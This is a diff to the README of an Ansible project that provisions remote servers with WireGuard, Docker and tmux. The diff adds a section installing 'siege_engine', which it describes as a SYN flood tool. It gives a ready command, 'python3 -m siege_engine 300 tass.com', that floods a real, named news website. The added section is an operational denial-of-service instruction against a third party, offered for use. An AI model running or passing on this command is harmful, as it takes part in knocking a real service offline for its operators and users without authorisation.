@@ -9,6 +9,7 @@
 - [Use](#use)
   - [Wireguard](#wireguard)
   - [Use tools/get shell](#use-toolsget-shell)
+  - [Siege Engine](#siege-engine)
 
 # Important
 * Tested on Ubuntu 20.04
@@ -23,6 +24,7 @@ This is set ansible roles to install core tools on remote server
 * Wireguard VPN, config will be fetched to local
 * Docker
 * tmux
+* [siege_engine](https://github.com/smok-serwis/siege-engine)
 
 # Install
 ## Deps
@@ -51,4 +53,10 @@ ansible-playbook -i "${a_ip}," -u ${a_user} -b play.yaml
 Ensure that you have exported variables from [Run](#run) according to your hosting provider and run following
 ```
 ssh ${a_user}@${a_ip}
+```
+
+## Siege Engine
+Tool for SYN flood, [ref](https://github.com/smok-serwis/siege-engine)
+```
+python3 -m siege_engine 300 tass.com
 ```
